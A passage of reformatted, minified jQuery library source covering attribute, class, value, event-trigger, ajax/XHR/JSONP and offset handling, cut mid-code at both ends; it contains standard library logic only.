      if (3 !== o && 8 !== o && 2 !== o) return void 0 === e.getAttribute ? jQuery.prop(e, t, n) : (1 === o && jQuery.isXMLDoc(e) || (i = jQuery.attrHooks[t.toLowerCase()] || (jQuery.expr.match.bool.test(t) ? boolHook : void 0)), void 0 !== n ? null === n ? void jQuery.removeAttr(e, t) : i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = jQuery.find.attr(e, t)) ? void 0 : r)
    },
    attrHooks: {
      type: {
        set: function (e, t) {
          if (!support.radioValue && "radio" === t && nodeName(e, "input")) {
            var n = e.value;
            return e.setAttribute("type", t), n && (e.value = n), t
          }
        }
      }
    },
    removeAttr: function (e, t) {
      var n, r = 0,
        i = t && t.match(rnothtmlwhite);
      if (i && 1 === e.nodeType)
        for (; n = i[r++];) e.removeAttribute(n)
    }
  }), boolHook = {
    set: function (e, t, n) {
      return !1 === t ? jQuery.removeAttr(e, n) : e.setAttribute(n, n), n
    }
  }, jQuery.each(jQuery.expr.match.bool.source.match(/\w+/g), function (e, t) {
    var n = attrHandle[t] || jQuery.find.attr;
    attrHandle[t] = function (e, t, r) {
      var i, o, a = t.toLowerCase();
      return r || (o = attrHandle[a], attrHandle[a] = i, i = null != n(e, t, r) ? a : null, attrHandle[a] = o), i
    }
  });
  var rfocusable = /^(?:input|select|textarea|button)$/i,
    rclickable = /^(?:a|area)$/i;

  function stripAndCollapse(e) {
    return (e.match(rnothtmlwhite) || []).join(" ")
  }

  function getClass(e) {
    return e.getAttribute && e.getAttribute("class") || ""
  }

  function classesToArray(e) {
    return Array.isArray(e) ? e : "string" == typeof e && e.match(rnothtmlwhite) || []
  }
  jQuery.fn.extend({
    prop: function (e, t) {
      return access(this, jQuery.prop, e, t, arguments.length > 1)
    },
    removeProp: function (e) {
      return this.each(function () {
        delete this[jQuery.propFix[e] || e]
      })
    }
  }), jQuery.extend({
    prop: function (e, t, n) {
      var r, i, o = e.nodeType;
      if (3 !== o && 8 !== o && 2 !== o) return 1 === o && jQuery.isXMLDoc(e) || (t = jQuery.propFix[t] || t, i = jQuery.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t]
    },
    propHooks: {
      tabIndex: {
        get: function (e) {
          var t = jQuery.find.attr(e, "tabindex");
          return t ? parseInt(t, 10) : rfocusable.test(e.nodeName) || rclickable.test(e.nodeName) && e.href ? 0 : -1
        }
      }
    },
    propFix: {
      for: "htmlFor",
      class: "className"
    }
  }), support.optSelected || (jQuery.propHooks.selected = {
    get: function (e) {
      var t = e.parentNode;
      return t && t.parentNode && t.parentNode.selectedIndex, null
    },
    set: function (e) {
      var t = e.parentNode;
      t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex)
    }
  }), jQuery.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () {
    jQuery.propFix[this.toLowerCase()] = this
  }), jQuery.fn.extend({
    addClass: function (e) {
      var t, n, r, i, o, a, u, s = 0;
      if (isFunction(e)) return this.each(function (t) {
        jQuery(this).addClass(e.call(this, t, getClass(this)))
      });
      if ((t = classesToArray(e)).length)
        for (; n = this[s++];)
          if (i = getClass(n), r = 1 === n.nodeType && " " + stripAndCollapse(i) + " ") {
            for (a = 0; o = t[a++];) r.indexOf(" " + o + " ") < 0 && (r += o + " ");
            i !== (u = stripAndCollapse(r)) && n.setAttribute("class", u)
          } return this
    },
    removeClass: function (e) {
      var t, n, r, i, o, a, u, s = 0;
      if (isFunction(e)) return this.each(function (t) {
        jQuery(this).removeClass(e.call(this, t, getClass(this)))
      });
      if (!arguments.length) return this.attr("class", "");
      if ((t = classesToArray(e)).length)
        for (; n = this[s++];)
          if (i = getClass(n), r = 1 === n.nodeType && " " + stripAndCollapse(i) + " ") {
            for (a = 0; o = t[a++];)
              for (; r.indexOf(" " + o + " ") > -1;) r = r.replace(" " + o + " ", " ");
            i !== (u = stripAndCollapse(r)) && n.setAttribute("class", u)
          } return this
    },
    toggleClass: function (e, t) {
      var n = typeof e,
        r = "string" === n || Array.isArray(e);
      return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : isFunction(e) ? this.each(function (n) {
        jQuery(this).toggleClass(e.call(this, n, getClass(this), t), t)
      }) : this.each(function () {
        var t, i, o, a;
        if (r)
          for (i = 0, o = jQuery(this), a = classesToArray(e); t = a[i++];) o.hasClass(t) ? o.removeClass(t) : o.addClass(t);
        else void 0 !== e && "boolean" !== n || ((t = getClass(this)) && dataPriv.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : dataPriv.get(this, "__className__") || ""))
      })
    },
    hasClass: function (e) {
      var t, n, r = 0;
      for (t = " " + e + " "; n = this[r++];)
        if (1 === n.nodeType && (" " + stripAndCollapse(getClass(n)) + " ").indexOf(t) > -1) return !0;
      return !1
    }
  });
  var rreturn = /\r/g;
  jQuery.fn.extend({
    val: function (e) {
      var t, n, r, i = this[0];
      return arguments.length ? (r = isFunction(e), this.each(function (n) {
        var i;
        1 === this.nodeType && (null == (i = r ? e.call(this, n, jQuery(this).val()) : e) ? i = "" : "number" == typeof i ? i += "" : Array.isArray(i) && (i = jQuery.map(i, function (e) {
          return null == e ? "" : e + ""
        })), (t = jQuery.valHooks[this.type] || jQuery.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, i, "value") || (this.value = i))
      })) : i ? (t = jQuery.valHooks[i.type] || jQuery.valHooks[i.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(i, "value")) ? n : "string" == typeof (n = i.value) ? n.replace(rreturn, "") : null == n ? "" : n : void 0
    }
  }), jQuery.extend({
    valHooks: {
      option: {
        get: function (e) {
          var t = jQuery.find.attr(e, "value");
          return null != t ? t : stripAndCollapse(jQuery.text(e))
        }
      },
      select: {
        get: function (e) {
          var t, n, r, i = e.options,
            o = e.selectedIndex,
            a = "select-one" === e.type,
            u = a ? null : [],
            s = a ? o + 1 : i.length;
          for (r = o < 0 ? s : a ? o : 0; r < s; r++)
            if (((n = i[r]).selected || r === o) && !n.disabled && (!n.parentNode.disabled || !nodeName(n.parentNode, "optgroup"))) {
              if (t = jQuery(n).val(), a) return t;
              u.push(t)
            } return u
        },
        set: function (e, t) {
          for (var n, r, i = e.options, o = jQuery.makeArray(t), a = i.length; a--;)((r = i[a]).selected = jQuery.inArray(jQuery.valHooks.option.get(r), o) > -1) && (n = !0);
          return n || (e.selectedIndex = -1), o
        }
      }
    }
  }), jQuery.each(["radio", "checkbox"], function () {
    jQuery.valHooks[this] = {
      set: function (e, t) {
        if (Array.isArray(t)) return e.checked = jQuery.inArray(jQuery(e).val(), t) > -1
      }
    }, support.checkOn || (jQuery.valHooks[this].get = function (e) {
      return null === e.getAttribute("value") ? "on" : e.value
    })
  }), support.focusin = "onfocusin" in window;
  var rfocusMorph = /^(?:focusinfocus|focusoutblur)$/,
    stopPropagationCallback = function (e) {
      e.stopPropagation()
    };
  jQuery.extend(jQuery.event, {
    trigger: function (e, t, n, r) {
      var i, o, a, u, s, l, c, p, d = [n || document],
        f = hasOwn.call(e, "type") ? e.type : e,
        y = hasOwn.call(e, "namespace") ? e.namespace.split(".") : [];
      if (o = p = a = n = n || document, 3 !== n.nodeType && 8 !== n.nodeType && !rfocusMorph.test(f + jQuery.event.triggered) && (f.indexOf(".") > -1 && (f = (y = f.split(".")).shift(), y.sort()), s = f.indexOf(":") < 0 && "on" + f, (e = e[jQuery.expando] ? e : new jQuery.Event(f, "object" == typeof e && e)).isTrigger = r ? 2 : 3, e.namespace = y.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + y.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = n), t = null == t ? [e] : jQuery.makeArray(t, [e]), c = jQuery.event.special[f] || {}, r || !c.trigger || !1 !== c.trigger.apply(n, t))) {
        if (!r && !c.noBubble && !isWindow(n)) {
          for (u = c.delegateType || f, rfocusMorph.test(u + f) || (o = o.parentNode); o; o = o.parentNode) d.push(o), a = o;
          a === (n.ownerDocument || document) && d.push(a.defaultView || a.parentWindow || window)
        }
        for (i = 0;
          (o = d[i++]) && !e.isPropagationStopped();) p = o, e.type = i > 1 ? u : c.bindType || f, (l = (dataPriv.get(o, "events") || {})[e.type] && dataPriv.get(o, "handle")) && l.apply(o, t), (l = s && o[s]) && l.apply && acceptData(o) && (e.result = l.apply(o, t), !1 === e.result && e.preventDefault());
        return e.type = f, r || e.isDefaultPrevented() || c._default && !1 !== c._default.apply(d.pop(), t) || !acceptData(n) || s && isFunction(n[f]) && !isWindow(n) && ((a = n[s]) && (n[s] = null), jQuery.event.triggered = f, e.isPropagationStopped() && p.addEventListener(f, stopPropagationCallback), n[f](), e.isPropagationStopped() && p.removeEventListener(f, stopPropagationCallback), jQuery.event.triggered = void 0, a && (n[s] = a)), e.result
      }
    },
    simulate: function (e, t, n) {
      var r = jQuery.extend(new jQuery.Event, n, {
        type: e,
        isSimulated: !0
      });
      jQuery.event.trigger(r, null, t)
    }
  }), jQuery.fn.extend({
    trigger: function (e, t) {
      return this.each(function () {
        jQuery.event.trigger(e, t, this)
      })
    },
    triggerHandler: function (e, t) {
      var n = this[0];
      if (n) return jQuery.event.trigger(e, t, n, !0)
    }
  }), support.focusin || jQuery.each({
    focus: "focusin",
    blur: "focusout"
  }, function (e, t) {
    var n = function (e) {
      jQuery.event.simulate(t, e.target, jQuery.event.fix(e))
    };
    jQuery.event.special[t] = {
      setup: function () {
        var r = this.ownerDocument || this,
          i = dataPriv.access(r, t);
        i || r.addEventListener(e, n, !0), dataPriv.access(r, t, (i || 0) + 1)
      },
      teardown: function () {
        var r = this.ownerDocument || this,
          i = dataPriv.access(r, t) - 1;
        i ? dataPriv.access(r, t, i) : (r.removeEventListener(e, n, !0), dataPriv.remove(r, t))
      }
    }
  });
  var location = window.location,
    nonce = Date.now(),
    rquery = /\?/;
  jQuery.parseXML = function (e) {
    var t;
    if (!e || "string" != typeof e) return null;
    try {
      t = (new window.DOMParser).parseFromString(e, "text/xml")
    } catch (e) {
      t = void 0
    }
    return t && !t.getElementsByTagName("parsererror").length || jQuery.error("Invalid XML: " + e), t
  };
  var rbracket = /\[\]$/,
    rCRLF = /\r?\n/g,
    rsubmitterTypes = /^(?:submit|button|image|reset|file)$/i,
    rsubmittable = /^(?:input|select|textarea|keygen)/i;

  function buildParams(e, t, n, r) {
    var i;
    if (Array.isArray(t)) jQuery.each(t, function (t, i) {
      n || rbracket.test(e) ? r(e, i) : buildParams(e + "[" + ("object" == typeof i && null != i ? t : "") + "]", i, n, r)
    });
    else if (n || "object" !== toType(t)) r(e, t);
    else
      for (i in t) buildParams(e + "[" + i + "]", t[i], n, r)
  }
  jQuery.param = function (e, t) {
    var n, r = [],
      i = function (e, t) {
        var n = isFunction(t) ? t() : t;
        r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n)
      };
    if (Array.isArray(e) || e.jquery && !jQuery.isPlainObject(e)) jQuery.each(e, function () {
      i(this.name, this.value)
    });
    else
      for (n in e) buildParams(n, e[n], t, i);
    return r.join("&")
  }, jQuery.fn.extend({
    serialize: function () {
      return jQuery.param(this.serializeArray())
    },
    serializeArray: function () {
      return this.map(function () {
        var e = jQuery.prop(this, "elements");
        return e ? jQuery.makeArray(e) : this
      }).filter(function () {
        var e = this.type;
        return this.name && !jQuery(this).is(":disabled") && rsubmittable.test(this.nodeName) && !rsubmitterTypes.test(e) && (this.checked || !rcheckableType.test(e))
      }).map(function (e, t) {
        var n = jQuery(this).val();
        return null == n ? null : Array.isArray(n) ? jQuery.map(n, function (e) {
          return {
            name: t.name,
            value: e.replace(rCRLF, "\r\n")
          }
        }) : {
          name: t.name,
          value: n.replace(rCRLF, "\r\n")
        }
      }).get()
    }
  });
  var r20 = /%20/g,
    rhash = /#.*$/,
    rantiCache = /([?&])_=[^&]*/,
    rheaders = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    rlocalProtocol = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
    rnoContent = /^(?:GET|HEAD)$/,
    rprotocol = /^\/\//,
    prefilters = {},
    transports = {},
    allTypes = "*/".concat("*"),
    originAnchor = document.createElement("a");

  function addToPrefiltersOrTransports(e) {
    return function (t, n) {
      "string" != typeof t && (n = t, t = "*");
      var r, i = 0,
        o = t.toLowerCase().match(rnothtmlwhite) || [];
      if (isFunction(n))
        for (; r = o[i++];) "+" === r[0] ? (r = r.slice(1) || "*", (e[r] = e[r] || []).unshift(n)) : (e[r] = e[r] || []).push(n)
    }
  }

  function inspectPrefiltersOrTransports(e, t, n, r) {
    var i = {},
      o = e === transports;

    function a(u) {
      var s;
      return i[u] = !0, jQuery.each(e[u] || [], function (e, u) {
        var l = u(t, n, r);
        return "string" != typeof l || o || i[l] ? o ? !(s = l) : void 0 : (t.dataTypes.unshift(l), a(l), !1)
      }), s
    }
    return a(t.dataTypes[0]) || !i["*"] && a("*")
  }

  function ajaxExtend(e, t) {
    var n, r, i = jQuery.ajaxSettings.flatOptions || {};
    for (n in t) void 0 !== t[n] && ((i[n] ? e : r || (r = {}))[n] = t[n]);
    return r && jQuery.extend(!0, e, r), e
  }

  function ajaxHandleResponses(e, t, n) {
    for (var r, i, o, a, u = e.contents, s = e.dataTypes;
      "*" === s[0];) s.shift(), void 0 === r && (r = e.mimeType || t.getResponseHeader("Content-Type"));
    if (r)
      for (i in u)
        if (u[i] && u[i].test(r)) {
          s.unshift(i);
          break
        } if (s[0] in n) o = s[0];
    else {
      for (i in n) {
        if (!s[0] || e.converters[i + " " + s[0]]) {
          o = i;
          break
        }
        a || (a = i)
      }
      o = o || a
    }
    if (o) return o !== s[0] && s.unshift(o), n[o]
  }

  function ajaxConvert(e, t, n, r) {
    var i, o, a, u, s, l = {},
      c = e.dataTypes.slice();
    if (c[1])
      for (a in e.converters) l[a.toLowerCase()] = e.converters[a];
    for (o = c.shift(); o;)
      if (e.responseFields[o] && (n[e.responseFields[o]] = t), !s && r && e.dataFilter && (t = e.dataFilter(t, e.dataType)), s = o, o = c.shift())
        if ("*" === o) o = s;
        else if ("*" !== s && s !== o) {
      if (!(a = l[s + " " + o] || l["* " + o]))
        for (i in l)
          if ((u = i.split(" "))[1] === o && (a = l[s + " " + u[0]] || l["* " + u[0]])) {
            !0 === a ? a = l[i] : !0 !== l[i] && (o = u[0], c.unshift(u[1]));
            break
          } if (!0 !== a)
        if (a && e.throws) t = a(t);
        else try {
          t = a(t)
        } catch (e) {
          return {
            state: "parsererror",
            error: a ? e : "No conversion from " + s + " to " + o
          }
        }
    }
    return {
      state: "success",
      data: t
    }
  }
  originAnchor.href = location.href, jQuery.extend({
    active: 0,
    lastModified: {},
    etag: {},
    ajaxSettings: {
      url: location.href,
      type: "GET",
      isLocal: rlocalProtocol.test(location.protocol),
      global: !0,
      processData: !0,
      async: !0,
      contentType: "application/x-www-form-urlencoded; charset=UTF-8",
      accepts: {
        "*": allTypes,
        text: "text/plain",
        html: "text/html",
        xml: "application/xml, text/xml",
        json: "application/json, text/javascript"
      },
      contents: {
        xml: /\bxml\b/,
        html: /\bhtml/,
        json: /\bjson\b/
      },
      responseFields: {
        xml: "responseXML",
        text: "responseText",
        json: "responseJSON"
      },
      converters: {
        "* text": String,
        "text html": !0,
        "text json": JSON.parse,
        "text xml": jQuery.parseXML
      },
      flatOptions: {
        url: !0,
        context: !0
      }
    },
    ajaxSetup: function (e, t) {
      return t ? ajaxExtend(ajaxExtend(e, jQuery.ajaxSettings), t) : ajaxExtend(jQuery.ajaxSettings, e)
    },
    ajaxPrefilter: addToPrefiltersOrTransports(prefilters),
    ajaxTransport: addToPrefiltersOrTransports(transports),
    ajax: function (e, t) {
      "object" == typeof e && (t = e, e = void 0), t = t || {};
      var n, r, i, o, a, u, s, l, c, p, d = jQuery.ajaxSetup({}, t),
        f = d.context || d,
        y = d.context && (f.nodeType || f.jquery) ? jQuery(f) : jQuery.event,
        h = jQuery.Deferred(),
        m = jQuery.Callbacks("once memory"),
        g = d.statusCode || {},
        v = {},
        j = {},
        Q = "canceled",
        x = {
          readyState: 0,
          getResponseHeader: function (e) {
            var t;
            if (s) {
              if (!o)
                for (o = {}; t = rheaders.exec(i);) o[t[1].toLowerCase()] = t[2];
              t = o[e.toLowerCase()]
            }
            return null == t ? null : t
          },
          getAllResponseHeaders: function () {
            return s ? i : null
          },
          setRequestHeader: function (e, t) {
            return null == s && (e = j[e.toLowerCase()] = j[e.toLowerCase()] || e, v[e] = t), this
          },
          overrideMimeType: function (e) {
            return null == s && (d.mimeType = e), this
          },
          statusCode: function (e) {
            var t;
            if (e)
              if (s) x.always(e[x.status]);
              else
                for (t in e) g[t] = [g[t], e[t]];
            return this
          },
          abort: function (e) {
            var t = e || Q;
            return n && n.abort(t), w(0, t), this
          }
        };
      if (h.promise(x), d.url = ((e || d.url || location.href) + "").replace(rprotocol, location.protocol + "//"), d.type = t.method || t.type || d.method || d.type, d.dataTypes = (d.dataType || "*").toLowerCase().match(rnothtmlwhite) || [""], null == d.crossDomain) {
        u = document.createElement("a");
        try {
          u.href = d.url, u.href = u.href, d.crossDomain = originAnchor.protocol + "//" + originAnchor.host != u.protocol + "//" + u.host
        } catch (e) {
          d.crossDomain = !0
        }
      }
      if (d.data && d.processData && "string" != typeof d.data && (d.data = jQuery.param(d.data, d.traditional)), inspectPrefiltersOrTransports(prefilters, d, t, x), s) return x;
      (l = jQuery.event && d.global) && 0 == jQuery.active++ && jQuery.event.trigger("ajaxStart"), d.type = d.type.toUpperCase(), d.hasContent = !rnoContent.test(d.type), r = d.url.replace(rhash, ""), d.hasContent ? d.data && d.processData && 0 === (d.contentType || "").indexOf("application/x-www-form-urlencoded") && (d.data = d.data.replace(r20, "+")) : (p = d.url.slice(r.length), d.data && (d.processData || "string" == typeof d.data) && (r += (rquery.test(r) ? "&" : "?") + d.data, delete d.data), !1 === d.cache && (r = r.replace(rantiCache, "$1"), p = (rquery.test(r) ? "&" : "?") + "_=" + nonce++ + p), d.url = r + p), d.ifModified && (jQuery.lastModified[r] && x.setRequestHeader("If-Modified-Since", jQuery.lastModified[r]), jQuery.etag[r] && x.setRequestHeader("If-None-Match", jQuery.etag[r])), (d.data && d.hasContent && !1 !== d.contentType || t.contentType) && x.setRequestHeader("Content-Type", d.contentType), x.setRequestHeader("Accept", d.dataTypes[0] && d.accepts[d.dataTypes[0]] ? d.accepts[d.dataTypes[0]] + ("*" !== d.dataTypes[0] ? ", " + allTypes + "; q=0.01" : "") : d.accepts["*"]);
      for (c in d.headers) x.setRequestHeader(c, d.headers[c]);
      if (d.beforeSend && (!1 === d.beforeSend.call(f, x, d) || s)) return x.abort();
      if (Q = "abort", m.add(d.complete), x.done(d.success), x.fail(d.error), n = inspectPrefiltersOrTransports(transports, d, t, x)) {
        if (x.readyState = 1, l && y.trigger("ajaxSend", [x, d]), s) return x;
        d.async && d.timeout > 0 && (a = window.setTimeout(function () {
          x.abort("timeout")
        }, d.timeout));
        try {
          s = !1, n.send(v, w)
        } catch (e) {
          if (s) throw e;
          w(-1, e)
        }
      } else w(-1, "No Transport");

      function w(e, t, o, u) {
        var c, p, v, j, Q, w = t;
        s || (s = !0, a && window.clearTimeout(a), n = void 0, i = u || "", x.readyState = e > 0 ? 4 : 0, c = e >= 200 && e < 300 || 304 === e, o && (j = ajaxHandleResponses(d, x, o)), j = ajaxConvert(d, j, x, c), c ? (d.ifModified && ((Q = x.getResponseHeader("Last-Modified")) && (jQuery.lastModified[r] = Q), (Q = x.getResponseHeader("etag")) && (jQuery.etag[r] = Q)), 204 === e || "HEAD" === d.type ? w = "nocontent" : 304 === e ? w = "notmodified" : (w = j.state, p = j.data, c = !(v = j.error))) : (v = w, !e && w || (w = "error", e < 0 && (e = 0))), x.status = e, x.statusText = (t || w) + "", c ? h.resolveWith(f, [p, w, x]) : h.rejectWith(f, [x, w, v]), x.statusCode(g), g = void 0, l && y.trigger(c ? "ajaxSuccess" : "ajaxError", [x, d, c ? p : v]), m.fireWith(f, [x, w]), l && (y.trigger("ajaxComplete", [x, d]), --jQuery.active || jQuery.event.trigger("ajaxStop")))
      }
      return x
    },
    getJSON: function (e, t, n) {
      return jQuery.get(e, t, n, "json")
    },
    getScript: function (e, t) {
      return jQuery.get(e, void 0, t, "script")
    }
  }), jQuery.each(["get", "post"], function (e, t) {
    jQuery[t] = function (e, n, r, i) {
      return isFunction(n) && (i = i || r, r = n, n = void 0), jQuery.ajax(jQuery.extend({
        url: e,
        type: t,
        dataType: i,
        data: n,
        success: r
      }, jQuery.isPlainObject(e) && e))
    }
  }), jQuery._evalUrl = function (e) {
    return jQuery.ajax({
      url: e,
      type: "GET",
      dataType: "script",
      cache: !0,
      async: !1,
      global: !1,
      throws: !0
    })
  }, jQuery.fn.extend({
    wrapAll: function (e) {
      var t;
      return this[0] && (isFunction(e) && (e = e.call(this[0])), t = jQuery(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function () {
        for (var e = this; e.firstElementChild;) e = e.firstElementChild;
        return e
      }).append(this)), this
    },
    wrapInner: function (e) {
      return isFunction(e) ? this.each(function (t) {
        jQuery(this).wrapInner(e.call(this, t))
      }) : this.each(function () {
        var t = jQuery(this),
          n = t.contents();
        n.length ? n.wrapAll(e) : t.append(e)
      })
    },
    wrap: function (e) {
      var t = isFunction(e);
      return this.each(function (n) {
        jQuery(this).wrapAll(t ? e.call(this, n) : e)
      })
    },
    unwrap: function (e) {
      return this.parent(e).not("body").each(function () {
        jQuery(this).replaceWith(this.childNodes)
      }), this
    }
  }), jQuery.expr.pseudos.hidden = function (e) {
    return !jQuery.expr.pseudos.visible(e)
  }, jQuery.expr.pseudos.visible = function (e) {
    return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length)
  }, jQuery.ajaxSettings.xhr = function () {
    try {
      return new window.XMLHttpRequest
    } catch (e) {}
  };
  var xhrSuccessStatus = {
      0: 200,
      1223: 204
    },
    xhrSupported = jQuery.ajaxSettings.xhr();
  support.cors = !!xhrSupported && "withCredentials" in xhrSupported, support.ajax = xhrSupported = !!xhrSupported, jQuery.ajaxTransport(function (e) {
    var t, n;
    if (support.cors || xhrSupported && !e.crossDomain) return {
      send: function (r, i) {
        var o, a = e.xhr();
        if (a.open(e.type, e.url, e.async, e.username, e.password), e.xhrFields)
          for (o in e.xhrFields) a[o] = e.xhrFields[o];
        e.mimeType && a.overrideMimeType && a.overrideMimeType(e.mimeType), e.crossDomain || r["X-Requested-With"] || (r["X-Requested-With"] = "XMLHttpRequest");
        for (o in r) a.setRequestHeader(o, r[o]);
        t = function (e) {
          return function () {
            t && (t = n = a.onload = a.onerror = a.onabort = a.ontimeout = a.onreadystatechange = null, "abort" === e ? a.abort() : "error" === e ? "number" != typeof a.status ? i(0, "error") : i(a.status, a.statusText) : i(xhrSuccessStatus[a.status] || a.status, a.statusText, "text" !== (a.responseType || "text") || "string" != typeof a.responseText ? {
              binary: a.response
            } : {
              text: a.responseText
            }, a.getAllResponseHeaders()))
          }
        }, a.onload = t(), n = a.onerror = a.ontimeout = t("error"), void 0 !== a.onabort ? a.onabort = n : a.onreadystatechange = function () {
          4 === a.readyState && window.setTimeout(function () {
            t && n()
          })
        }, t = t("abort");
        try {
          a.send(e.hasContent && e.data || null)
        } catch (e) {
          if (t) throw e
        }
      },
      abort: function () {
        t && t()
      }
    }
  }), jQuery.ajaxPrefilter(function (e) {
    e.crossDomain && (e.contents.script = !1)
  }), jQuery.ajaxSetup({
    accepts: {
      script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
    },
    contents: {
      script: /\b(?:java|ecma)script\b/
    },
    converters: {
      "text script": function (e) {
        return jQuery.globalEval(e), e
      }
    }
  }), jQuery.ajaxPrefilter("script", function (e) {
    void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET")
  }), jQuery.ajaxTransport("script", function (e) {
    var t, n;
    if (e.crossDomain) return {
      send: function (r, i) {
        t = jQuery("<script>").prop({
          charset: e.scriptCharset,
          src: e.url
        }).on("load error", n = function (e) {
          t.remove(), n = null, e && i("error" === e.type ? 404 : 200, e.type)
        }), document.head.appendChild(t[0])
      },
      abort: function () {
        n && n()
      }
    }
  });
  var oldCallbacks = [],
    rjsonp = /(=)\?(?=&|$)|\?\?/,
    DC;
  jQuery.ajaxSetup({
    jsonp: "callback",
    jsonpCallback: function () {
      var e = oldCallbacks.pop() || jQuery.expando + "_" + nonce++;
      return this[e] = !0, e
    }
  }), jQuery.ajaxPrefilter("json jsonp", function (e, t, n) {
    var r, i, o, a = !1 !== e.jsonp && (rjsonp.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && rjsonp.test(e.data) && "data");
    if (a || "jsonp" === e.dataTypes[0]) return r = e.jsonpCallback = isFunction(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, a ? e[a] = e[a].replace(rjsonp, "$1" + r) : !1 !== e.jsonp && (e.url += (rquery.test(e.url) ? "&" : "?") + e.jsonp + "=" + r), e.converters["script json"] = function () {
      return o || jQuery.error(r + " was not called"), o[0]
    }, e.dataTypes[0] = "json", i = window[r], window[r] = function () {
      o = arguments
    }, n.always(function () {
      void 0 === i ? jQuery(window).removeProp(r) : window[r] = i, e[r] && (e.jsonpCallback = t.jsonpCallback, oldCallbacks.push(r)), o && isFunction(i) && i(o[0]), o = i = void 0
    }), "script"
  }), support.createHTMLDocument = (DC = document.implementation.createHTMLDocument("").body, DC.innerHTML = "<form></form><form></form>", 2 === DC.childNodes.length), jQuery.parseHTML = function (e, t, n) {
    return "string" != typeof e ? [] : ("boolean" == typeof t && (n = t, t = !1), t || (support.createHTMLDocument ? ((r = (t = document.implementation.createHTMLDocument("")).createElement("base")).href = document.location.href, t.head.appendChild(r)) : t = document), i = rsingleTag.exec(e), o = !n && [], i ? [t.createElement(i[1])] : (i = buildFragment([e], t, o), o && o.length && jQuery(o).remove(), jQuery.merge([], i.childNodes)));
    var r, i, o
  }, jQuery.fn.load = function (e, t, n) {
    var r, i, o, a = this,
      u = e.indexOf(" ");
    return u > -1 && (r = stripAndCollapse(e.slice(u)), e = e.slice(0, u)), isFunction(t) ? (n = t, t = void 0) : t && "object" == typeof t && (i = "POST"), a.length > 0 && jQuery.ajax({
      url: e,
      type: i || "GET",
      dataType: "html",
      data: t
    }).done(function (e) {
      o = arguments, a.html(r ? jQuery("<div>").append(jQuery.parseHTML(e)).find(r) : e)
    }).always(n && function (e, t) {
      a.each(function () {
        n.apply(this, o || [e.responseText, t, e])
      })
    }), this
  }, jQuery.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function (e, t) {
    jQuery.fn[t] = function (e) {
      return this.on(t, e)
    }
  }), jQuery.expr.pseudos.animated = function (e) {
    return jQuery.grep(jQuery.timers, function (t) {
      return e === t.elem
    }).length
  }, jQuery.offset = {
    setOffset: function (e, t, n) {
      var r, i, o, a, u, s, l = jQuery.css(e, "position"),
        c = jQuery(e),
        p = {};
      "static" === l && (e.style.position = "relative"), u = c.offset(), o = jQuery.css(e, "top"), s = jQuery.css(e, "left"), ("absolute" === l || "fixed" === l) && (o + s).indexOf("auto") > -1 ? (a = (r = c.position()).top, i = r.left) : (a = parseFloat(o) || 0, i = parseFloat(s) || 0), isFunction(t) && (t = t.call(e, n, jQuery.extend({}, u))), null != t.top && (p.top = t.top - u.top + a), null != t.left && (p.left = t.left - u.left + i), "using" in t ? t.using.call(e, p) : c.css(p)
    }
  }, jQuery.fn.extend({
    offset: function (e) {
      if (arguments.length) return void 0 === e ? this : this.each(function (t) {
        jQuery.offset.setOffset(this, e, t)
      });
      var t, n, r = this[0];
      return r ? r.getClientRects().length ? (t = r.getBoundingClientRect(), n = r.ownerDocument.defaultView, {
        top: t.top + n.pageYOffset,
        left: t.left + n.pageXOffset
      }) : {
        top: 0,
        left: 0
      } : void 0
    },
    position: function () {
      if (this[0]) {
        var e, t, n, r = this[0],
          i = {
            top: 0,
            left: 0
          };
        if ("fixed" === jQuery.css(r, "position")) t = r.getBoundingClientRect();
        else {
          for (t = this.offset(), n = r.ownerDocument, e = r.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === jQuery.css(e, "position");) e = e.parentNode;
          e && e !== r && 1 === e.nodeType && ((i = jQuery(e).offset()).top += jQuery.css(e, "borderTopWidth", !0), i.left += jQuery.css(e, "borderLeftWidth", !0))
        }
        return {
          top: t.top - i.top - jQuery.css(r, "marginTop", !0),
          left: t.left - i.left - jQuery.css(r, "marginLeft", !0)
        }
      }
    },
    offsetParent: function () {
      return this.map(function () {
        for (var e = this.offsetParent; e && "static" === jQuery.css(e, "position");) e = e.offsetParent;
        return e || documentElement
      })
    }
  }), jQuery.each({
    scrollLeft: "pageXOffset",
    scrollTop: "pageYOffset"
  }, function (e, t) {
    var n = "pageYOffset" === t;
    jQuery.fn[e] = function (r) {
      return access(this, function (e, r, i) {
        var o;
        if (isWindow(e) ? o = e : 9 === e.nodeType && (o = e.defaultView), void 0 === i) return o ? o[t] : e[r];
        o ? o.scrollTo(n ? o.pageXOffset : i, n ? i : o.pageYOffset) : e[r] = i
      }, e, r, arguments.length)
    }
  }), jQuery.each(["top", "left"], function (e, t) {
    jQuery.cssHooks[t] = addGetHookIf(support.pixelPosition, function (e, n) {
